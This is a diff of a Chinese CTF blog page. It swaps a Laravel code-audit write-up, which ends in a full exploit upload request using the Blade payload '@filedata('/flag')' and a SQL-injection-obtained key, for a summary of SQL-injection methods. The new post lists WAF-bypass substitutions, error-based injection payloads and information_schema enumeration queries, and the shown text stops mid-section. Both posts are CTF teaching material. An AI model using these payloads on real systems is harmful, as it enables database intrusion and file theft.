@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://geeeez.github.io">
-  <title>一道php代码审计题目的心路历程 | geez博客</title>
+  <title>CTF中的sql注入总结 | geez博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一道php代码审计题目的心路历程">
+  <meta name="description" content="CTF中的sql注入总结">
 <meta name="keywords" content="ctf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一道php代码审计题目的心路历程">
-<meta property="og:url" content="https://geeeez.github.io/2019/09/10/一道php代码审计题目的心路历程/index.html">
+<meta property="og:title" content="CTF中的sql注入总结">
+<meta property="og:url" content="https://geeeez.github.io/2018/11/01/CTF中的sql注入/index.html">
 <meta property="og:site_name" content="geez博客">
-<meta property="og:description" content="一道php代码审计题目的心路历程">
+<meta property="og:description" content="CTF中的sql注入总结">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-09-23T10:00:58.631Z">
+<meta property="og:updated_time" content="2019-10-09T16:12:12.329Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="一道php代码审计题目的心路历程">
-<meta name="twitter:description" content="一道php代码审计题目的心路历程">
+<meta name="twitter:title" content="CTF中的sql注入总结">
+<meta name="twitter:description" content="CTF中的sql注入总结">
   
     <link rel="alternative" href="/atom.xml" title="geez博客" type="application/atom+xml">
   
@@ -177,45 +177,193 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-一道php代码审计题目的心路历程" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-CTF中的sql注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      一道php代码审计题目的心路历程
+      CTF中的sql注入总结
     </h1>
   
 
         
-        <a href="/2019/09/10/一道php代码审计题目的心路历程/" class="archive-article-date">
-  	<time datetime="2019-09-10T14:00:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+        <a href="/2018/11/01/CTF中的sql注入/" class="archive-article-date">
+  	<time datetime="2018-11-01T14:00:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前端时间做了一道CTF-php代码审计的题目，此题目说难也不算难，属于中等偏上一点点的题目。我在三个小时内做出来了，但是我忽然回顾我做这种代码审计题目的时候，发现这四年的比赛生涯，代码审计题目永远都是我的弱项，而且成长极慢。总是在一头雾水中开始，一头雾水中结束。所以我想梳理一下这道题目我是怎么做出来的，并解决以下问题：<br>1、遇到代码审计的题目从哪里入手才是正确的<br>2、做到哪里是难点，坚持不下去了，这时候应该怎么办<br>3、完全审计清楚，但是仍不会利用怎么办<br>旨在希望自己能真正的理解这些东西。<a id="more"></a></p>
-<h4 id="源码地址-amp-amp-一些交代"><a href="#源码地址-amp-amp-一些交代" class="headerlink" title="源码地址&amp;&amp;一些交代"></a>源码地址&amp;&amp;一些交代</h4><p>源码地址：<a href="https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g" target="_blank" rel="noopener">https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g</a><br>第一次看到题目发现无法入手，所以猜测肯定有相应的源码泄露（这是经验，没法传授。）通过dirb扫描发现备份文件 backup。然后下载进行分析。</p>
-<h4 id="入手源码"><a href="#入手源码" class="headerlink" title="入手源码"></a>入手源码</h4><p>知识点1：查看是否是框架二次开发<br>拿到源码后首先看read.me发现是Laravel，如果没有readme可以去看配置文件和一些图片是否能发现是框架二次开发还是出题人自己写的php demo。</p>
-<p>知识点2：快速了解框架<br>我们这里发现这个源码时基于Laravel开发的，而我也是从来没用过Laravel，所以马上去学习了一下，大概十几分钟，搞懂laravel的用处。主要通过简介和开发手册来进行学习，只要了解大概就行了。<br>我通过阅读官方手册目录大概了解了这个php框架：<br><a href="https://xueyuanjun.com/laravel-docs-5_6" target="_blank" rel="noopener">https://xueyuanjun.com/laravel-docs-5_6</a></p>
-<p>知识点3：漏洞点的查找<br>这时候你需要一个分析器，毕竟手动来搞太慢了，CTF是快者的世界。我用的是最老的那种seay源代码审计系统，不过还是挺好用的。<br>我通过这个审计工具发现：/app/Providers/AppServiceProvider.php 18行 存在任意文件读取漏洞</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">	\Blade::directive(<span class="string">'filedata'</span>, <span class="function"><span class="keyword">function</span><span class="params">($expression)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&lt;?php echo file_get_contents($expression); ?&gt;"</span>;</span><br><span class="line">            <span class="comment">//就是这里了 任意文件读取 但是这个东西是啥时候调用我们还不知道</span></span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>非常不想写这篇博客，因为ctf中的sql注入技巧太乱了，不知道怎么排版怎么分块把他表述清楚，然后又能像一个笔记一样时时供我查阅。所以直到我打现在这几个字的时候我都在想咋把我那嘈杂的笔记整理出这篇文章。但是整理肯定还是要整理的，毕竟自己也要看。<a id="more"></a></p>
+<h4 id="CTF-sql注入三原则"><a href="#CTF-sql注入三原则" class="headerlink" title="CTF sql注入三原则"></a>CTF sql注入三原则</h4><p>1.细致的猜测注入点的语句大概是什么样子。<br>2.判断是有回显的注入还是盲注，有回显的注入当盲注做是自己为难自己。<br>3.盲注优先考虑布尔盲注，然后才是时间盲注。</p>
+<h4 id="sql注入流程"><a href="#sql注入流程" class="headerlink" title="sql注入流程"></a>sql注入流程</h4><p>我们来捋一捋这个sql注入的一般流程，首先有一个注入点，然后肯定有一个waf，waf过滤了一些关键字，我们做的就是绕过关键字的过滤，构造能执行的sql语句去获取数据库的flag。捋完流程，我们就知道流程中每一步应该怎么做、应该做什么。在开始之前还是要提出几个注意点：<br>1.注意区分数据的大小写，因为mysql默认不区分数据的大小写比较<br>解决方法：ascii编码比较、WHERE后加BINARY、regexp<br>2.站在出题者角度思考问题。</p>
+<h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h5><p>自动化fuzz或者手工fuzz，如果不ban ip 、网络稳定，那么自动化fuzz还是很好用的。因为绝大多数都是关键字过滤，fuzz的准确度很高。脚本就是直接py请求查看响应是否有waf响应的关键字。<br>fuzz字典（不全，自行补充）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">or</span><br><span class="line">|</span><br><span class="line">%</span><br><span class="line">and</span><br><span class="line">%26</span><br><span class="line">&amp;</span><br><span class="line">union</span><br><span class="line">select</span><br><span class="line">information</span><br><span class="line">information_schema</span><br><span class="line">name</span><br><span class="line">table_name</span><br><span class="line">column_name</span><br><span class="line">if</span><br><span class="line">,</span><br><span class="line">%20</span><br><span class="line"> //空格</span><br><span class="line">sleep</span><br><span class="line">^</span><br><span class="line">in</span><br><span class="line">like</span><br><span class="line">between</span><br><span class="line">*</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">-</span><br><span class="line">.</span><br><span class="line">_</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">@</span><br><span class="line">user</span><br><span class="line">password</span><br><span class="line">passwd</span><br><span class="line">username</span><br></pre></td></tr></table></figure>
 
-<p>知识点4：漫长的分析学习过程<br>通过漏洞点可知是一个任意文件读取，但是这个函数怎么调用我们不知道，而且对laravel也不太了解，所以我们搜索 —&gt;  laravel AppServiceProvider boot 方法如何调用<br>结果中显示 boot在register方法后调用，为了解决一些注册问题，反正对laravel也不太懂，先跳过，直接搜索 Blade::directivez 发现这个Blade是模板引擎，它可以进行模板的自定义，Blade::directive是进行指令注册，里面的参数就是指令名称，当blade模板渲染的时候对应指定如果存在就会被调用。所以这时候我想到的是模板注入调用指令filedata进行文件读取</p>
-<p>但是无论怎么测试都没有模板注入点，所以可能是文件上传进行模板注入。于是我利用seay源码审计系统对upload进行了搜索。发现/routes/web.php 确实有一处上传点，不过需要key</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">'welcome'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">Route::get(<span class="string">'user_testpage/&#123;id&#125;'</span>, <span class="string">'UserController@index'</span>);</span><br><span class="line"></span><br><span class="line">Auth::routes();</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'/home'</span>, <span class="string">'HomeController@index'</span>)-&gt;name(<span class="string">'home'</span>);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'/home/profile'</span>,<span class="string">'ProfileController@show'</span>)-&gt;name(<span class="string">'profile'</span>);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">'/home/uploadto_upload'</span>,<span class="string">'HomeController@uploads'</span>)-&gt;name(<span class="string">'home'</span>);</span><br><span class="line"></span><br><span class="line">Route::post(<span class="string">'/home/uploadss/&#123;key&#125;'</span>,<span class="string">'HomeController@uploadss'</span>)-&gt;name(<span class="string">'home'</span>);</span><br></pre></td></tr></table></figure>
+<h5 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h5><p>绕过waf说白了就是同功能函数的替换，比如 substr == mid，下面我们就搞个这样的表方便大家查询(他们在一定成都上都有替代作用)。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">//比较判断</span><br><span class="line">&gt;  &lt;  &lt;&gt;  = and or || &amp;&amp; %26%26 like  between  regexp  in  strcmp  locate(s1,s)  position(s1 in s)  instr(s,s1)  greatest()  find_in_set() </span><br><span class="line">//ps：select &quot;123&quot; in (&quot;123&quot;); =&gt; 1 select &quot;123&quot; in (&quot;12&quot;)</span><br><span class="line"></span><br><span class="line">//ascii</span><br><span class="line">hex()</span><br><span class="line">bin()</span><br><span class="line">ord()</span><br><span class="line"></span><br><span class="line">//切割字符串</span><br><span class="line">left()</span><br><span class="line">right()</span><br><span class="line">mid()</span><br><span class="line">substr()</span><br><span class="line">substring()</span><br><span class="line">lpad()</span><br><span class="line">rpad()</span><br><span class="line">//ps:LPAD(&apos;abcdef&apos;,4,&apos;?&apos;); 和RPAD(&apos;abcdef&apos;,4,&apos;?&apos;);结果都为abcd</span><br><span class="line"></span><br><span class="line">//空格</span><br><span class="line">%20 + /**/ /*乱字符*/ </span><br><span class="line">1e1 1.1 () </span><br><span class="line">//这里的括号绕过是有限制的不是直接括号当空格用，还是举个例子把：</span><br><span class="line">select(id)from(user);  括号内不能是*。</span><br><span class="line">PS:浮点数科学计数法后面的字符串也不需要空格 比如：select 1.1and(1)</span><br><span class="line"></span><br><span class="line">//过滤逗号</span><br><span class="line">imit 0,1 =&gt; limit 1 offset 0;</span><br><span class="line">mid(str,5,1) =&gt;mid(&apos;str&apos;from 5 for 1) =&gt;substr(&apos;str&apos; from for 1)</span><br><span class="line">union select 1,2,3 =&gt; union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">mid(&apos;123&apos; from -1); =&gt;3 //适用于for被过滤</span><br><span class="line">mid(&apos;123&apos; from -2); =&gt;23 //适用于for被过滤</span><br><span class="line"></span><br><span class="line">//连接字符串的函数</span><br><span class="line">concat(str1,str2) 将字符串首尾相连</span><br><span class="line">concat_ws(separator,str1,str2) 将字符串用指定连接符连接</span><br><span class="line">group_concat()</span><br><span class="line"></span><br><span class="line">//注释</span><br><span class="line">#</span><br><span class="line">/**/</span><br><span class="line">--</span><br><span class="line">;%00 //mysql是C写的也存在00截断</span><br><span class="line"></span><br><span class="line">//延时函数</span><br><span class="line">sleep()</span><br><span class="line">benchmark(1000000,sha(1))</span><br><span class="line"></span><br><span class="line">//hex编码的用处</span><br><span class="line">所有用户输入的会拼接到=号后面的数据都可用hex编码比如：</span><br><span class="line">select * from user where username=0x7cb6e453</span><br><span class="line">这样的好处就是，比如不需要单引号 绕过关键字过滤等。</span><br><span class="line"></span><br><span class="line">//绕过一体化过滤 比如 过滤user()</span><br><span class="line">select user/**/()  //这样一样能执行，不过这样过滤的waf倒是很少见。</span><br><span class="line"></span><br><span class="line">//报错注入</span><br><span class="line">1.floor()</span><br><span class="line">and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">2.updatexml() //5.1.5</span><br><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">3.extractvalue() //5.1.5</span><br><span class="line">and extractvalue(1,concat(0x5c,(select user())))</span><br><span class="line"></span><br><span class="line">4.exp() //5.5.5版本之后可以使用</span><br><span class="line">select host from user where user = &apos;root&apos; and Exp(~(select * from (select version())a));</span><br><span class="line"></span><br><span class="line">5.name_const //支持老版本</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line"></span><br><span class="line">6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错</span><br><span class="line">select multipoint((select * from (select * from (select * from (select version())a)b)c));</span><br><span class="line"></span><br><span class="line">//宽字节注入就不说了，别人写太多了</span><br><span class="line">%df 逃离单引号的转义</span><br><span class="line"></span><br><span class="line">//limit where 被过滤 </span><br><span class="line">可以利用group by having 来做限制条件！</span><br><span class="line">select uid,uname,passwd from admin group by passwd having uid=1;这样就能得到一行数据 并且有where作用，当然没有where和limit那么方便，更多操作还有待开放呢！</span><br><span class="line"></span><br><span class="line">//番外篇之我的经验</span><br><span class="line">越来越多的用 xor ^ regexp 这些作比较</span><br><span class="line">常用payload if(mid(sql)=&apos;a&apos;，1，0)</span><br><span class="line">善用 length() 这样就知道查询的未知字段是多少长度，写脚本也方便，也能直接猜测长度对应的字符可能是啥。</span><br></pre></td></tr></table></figure>
 
-<p>key我找了好久没有找到，于是重新回到这个文件继续审查看看有没有新的发现。结果发现<br>文件还有一个路径 user_testpage/{id}，构造一个 user_testpage/1 发现有回显，立马意识到可能是sqli注入。<br>经过测试发现确实是sql注入在数据库查到所有用户密码，发现key就是第二个用户名NotAllow6171。<br>然后我们审查上传代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadss</span><span class="params">(Request $request,$key)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>($key!=&lt;in database key&gt;)&#123;<span class="keyword">die</span>(<span class="string">'sorry!'</span>);&#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ($request-&gt;isMethod(<span class="string">'post'</span>)) &#123;</span><br><span class="line"></span><br><span class="line">           $file = $request-&gt;file(<span class="string">'files'</span>);</span><br><span class="line">           <span class="keyword">if</span> ($file-&gt;isValid()) &#123;</span><br><span class="line">               $originalName = $file-&gt;getClientOriginalName(); <span class="comment">//文件原名</span></span><br><span class="line">               $ext = $file-&gt;getClientOriginalExtension();     <span class="comment">//扩展名</span></span><br><span class="line">               $realPath = $file-&gt;getRealPath();  </span><br><span class="line">               $type = $file-&gt;getClientMimeType();</span><br><span class="line">               $filecheck=<span class="keyword">new</span> HomeController();</span><br><span class="line">	        $filecheck-&gt;filecheck($realPath);</span><br><span class="line">	        $filename = date(<span class="string">'Y-m-d-H-i-s'</span>) . <span class="string">'-'</span> . uniqid() . <span class="string">'.'</span> . $ext;</span><br><span class="line">	        $path=$file -&gt; move(base_path().<span class="string">'/resources/views/auth/uploads'</span>,$originalName);  </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>通过上面的这些替换绕过waf,最终我们需要执行我们构造出来的语句来获取flag，一般是通过information_schema表，这个表相当于一个字典，保存了所有database的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">database() //获取当前数据库</span><br><span class="line">//查库</span><br><span class="line">select schema_name from information_Schema.schemata limit 1,1; </span><br><span class="line">//查表</span><br><span class="line">select table_name from information_Schema.tables where table_schema=database() limit 1,1</span><br><span class="line">查字段</span><br><span class="line">select column_name from information_schema.columns where table_schema=database() and table_name=&apos;user&apos; limit 0,1</span><br><span class="line">//</span><br></pre></td></tr></table></figure>
 
-<p>审计后发现是上传到 /resources/views/auth/uploads 我们先进入目录查看其他php文件发现：函数调用就是直接    函数名+（“参数”） 于是我们构造 @filedata(‘/flag’) 进行上传<br>构造上传，发现有CSRF 这个CSRF怎么过呢？再次查看routes/web.php 发现还有另一处上传点，但是功能异常，所以我们通过这个上传点获得token来伪造一个上传数据包。那么数据包中应该是什么呢？肯定是要调用filedata 函数的 我们通过观察其他静态页面</p>
-<p>最终payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /home/uploadss/NotAllow6171 HTTP/1.1</span><br><span class="line">Host: 119.61.19.212:8085</span><br><span class="line">Content-Length: 444</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: null</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvJNe9ABsnjeKGhDN</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: XSRF-TOKEN=eyJpdiI6IitoWjhwMm1ycmNTWFozSmZTTXJwXC9nPT0iLCJ2YWx1ZSI6IkllczhnNEZodldZbllTN0NmZDErR2I1eXF1bU9mV1wvYklManNuUnQ4YzhJcmlWQ09JVXJPXC9JNHZxVU0xRmdCY0RDbWJHelVwYjQyVjdXQ1FHVlFMMlE9PSIsIm1hYyI6IjNmMGUzZTEwYTA2ZDA2MjJjMDg4OTY5NTI4NDJjNTk2YmQ4N2U4NWYxY2E2ZjU3YWEwNTAwODllMzIyYTU4ZjAifQ%3D%3D; laravel_session=eyJpdiI6InRhRzZmenBJSmFLNHhrb0RlUE5OdVE9PSIsInZhbHVlIjoiZ01qK2JpQURoRHgxbFVrcGc4TE9PK2kycGxSTjlNRzkwK21uVDUxa3UyTW5JYXpIcWJaY2pYbXQwNDc0dklkemNjRmR0aFhZcllmTkRvQXpVUlR3d3c9PSIsIm1hYyI6IjAwMjVkODA3YmY5NDU1Y2U5MDMyMWMwMTI1MTcyMmQ1YTU5NWQzMTE0MGMxMzc0ZWM1NDU4YzQ5MWIyZjI5YTgifQ%3D%3D</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span><br><span class="line">Content-Disposition: form-data; name=&quot;_token&quot;</span><br><span class="line"></span><br><span class="line">Z7VZ7FXfNzuzETtQrZ7DeAZCFtbkQl9L8e7ptVin</span><br><span class="line">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span><br><span class="line">Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;template.blade.php&quot;</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">@filedata(&apos;/flag&apos;)</span><br><span class="line">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Submit</span><br><span class="line">------WebKitFor</span><br><span class="line">mBoundaryvJNe9ABsnjeKGhDN--</span><br></pre></td></tr></table></figure>
+<h4 id="还有一些小众的技巧"><a href="#还有一些小众的技巧" class="headerlink" title="还有一些小众的技巧"></a>还有一些小众的技巧</h4><h5 id="无法获取列名如何取数据"><a href="#无法获取列名如何取数据" class="headerlink" title="无法获取列名如何取数据"></a>无法获取列名如何取数据</h5><p>1.有回显的order by进行数据猜测</p>
+<table>
+<thead>
+<tr>
+<th align="center">id</th>
+<th align="center">username</th>
+<th align="center">xxxxxx</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">admin</td>
+<td align="center">flag{this_is_flag}</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">admin2</td>
+<td align="center">1</td>
+</tr>
+</tbody></table>
+<p>如上一个数据表flag，当我们通过information表获取到了表明和有多少列，但是死活不知道最后一列列名，那么怎么查？</p>
+<p>如果是有回显的注入可以这样</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'fl'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
 
-<h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><p>1、先搞懂框架、找到危险函数，也就是利用点，然后一条线分析下去。<br>2、遇到难点，审计不下去的时候，利用辅助工具，去查找一些敏感的函数 比如 login upload cookie sql语句等 也可以直接自动审计看看有什么思路。<br>3、完全审计清楚代码逻辑，但是不知道怎么利用的时候就多去百度对应函数，并百度对应框架的漏洞，参考别人的思路。仔细查看一些已经存在的文件。如果还是不知道如何利用那就是没看懂框架，再去跟一边正常功能的框架是如何实现的，函数是如何调用的！</p>
+<p>通过我们的联合查询的第三列来一步一步的比对出flag是什么字符串。举个例子：<br>比如我们的显示位是3那么：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'fl'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这样如果我们的fl显示出来那么说明，它下面的字段应该是fl+字符，注意这里必须一位一位的去尝试。当然这个方法局限性很大，还很麻烦。</p>
+<p>2.大多的时候是盲注，那就可以使用三表联合查询法：<br>网上的三表联合查询法总是讲不清楚，下面我们来分解下，你不用搞清楚什么是三表联合查询，你只需搞清楚每一步是什么意思即可。<br>首先我们构造一列：</p>
